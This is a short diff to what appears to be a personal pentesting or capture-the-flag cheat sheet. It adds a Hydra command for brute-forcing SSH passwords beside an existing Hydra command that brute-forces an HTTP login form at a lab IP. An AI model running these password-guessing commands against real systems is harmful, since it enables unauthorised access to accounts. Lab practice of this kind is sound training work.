@@ -22,5 +22,10 @@ example:
 ```shell
 hydra -l <username> -P <wordlist> 10.10.88.56 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
 ```
+## SSH
+```shell
+hydra -l <username> -P <wordlist> ssh://<ip> -t <threads> -vV
+```
+
 # TIPS
 make sure to use full error message
